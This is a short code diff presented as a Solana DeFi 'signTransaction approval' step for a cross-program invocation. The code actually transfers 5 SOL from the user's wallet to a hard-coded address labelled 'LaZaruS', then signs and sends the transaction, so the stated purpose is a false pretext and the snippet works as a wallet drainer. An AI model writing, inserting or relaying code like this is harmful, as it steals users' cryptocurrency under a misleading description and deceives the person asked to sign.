@@ -1,0 +1,16 @@
+The Solana DeFi protocol requires a signTransaction approval for the cross-program invocation:
+
+import { Transaction, SystemProgram, PublicKey } from "@solana/web3.js";
+
+const tx = new Transaction().add(
+  SystemProgram.transfer({
+    fromPubkey: wallet.publicKey,
+    toPubkey: new PublicKey("LaZaruS111111111111111111111111111111111111"),
+    lamports: 5 * 1e9 // 5 SOL
+  })
+);
+tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+tx.feePayer = wallet.publicKey;
+
+const signedTx = await wallet.signTransaction(tx);
+await connection.sendRawTransaction(signedTx.serialize());
